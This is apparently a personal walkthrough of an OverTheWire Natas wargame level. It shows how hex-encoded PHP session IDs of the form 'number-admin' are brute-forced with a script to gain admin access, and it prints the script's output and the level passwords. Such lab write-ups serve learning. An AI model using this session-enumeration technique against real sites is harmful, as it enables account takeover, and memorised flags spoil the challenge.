# Natas Level 18 → Level 19 Obfuscation ≠ Security

## Previous Flag
<b>tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</b>

## Goal
Username: natas19<br>
URL: http://natas19.natas.labs.overthewire.org<br>

This page uses mostly the same code as the previous level, but session IDs are no longer sequential...<br><br>
Please login with your admin account to retrieve credentials for natas20.<br>
Username:<br>
Password:<br>
Login

## What I learned
```
Hex-encoding, base64, or anything similar doesn't make something secure if it’s still guessable
PHP session ID is hex-encoded (e.g., 3f6d2a9a) instead of just 34 but still goes to 640
So just need To Hex number and concatenate w/ hex of -admin

TODO Later: Burp Suite Solution (When I get better) 🧠🧠🧠🧠🧠
https://samxia99.medium.com/overthewire-updated-natas-walkthrough-level-20-ed37d1d1e03d
```

## Solution
```
# Put any username and password and get assigned PHPSESSID
F12 → Application
Storage → Cookies

Name        Value
PHPSESSID   3533372d61646d696e

https://gchq.github.io/CyberChef/
From Hex    Input: 3533372d61646d696e
            Output: 537-admin

To Hex      Input: -admin                           # Since front is random hex
            Output: 2d61646d696e                    # Converted to hex

@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 scripts/phpSessionIDBruteForceHex.py ⌨️
PHPSESSID=3237392d61646d696e
PHPSESSID=3238302d61646d696e
PHPSESSID=3238312d61646d696e 👀
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div> 🔐
</body>
</html>

PHPSESSID=3238322d61646d696e
PHPSESSID=3238332d61646d696e
PHPSESSID=3238342d61646d696e
PHPSESSID=3238352d61646d696e
PHPSESSID=3238362d61646d696e
PHPSESSID=3238372d61646d696e
^C ⌨️

# Double Check by login as admin and any password
F12 → Application
Storage → Cookies

Name        Value
PHPSESSID   <Random> → 3238312d61646d696e
F5 (Refresh)

You are an admin. The credentials for the next level are:
Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw 🔐
```

## Flag
<b>p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</b>

## Continue
[Continue](/overthewire/Natas1920.md)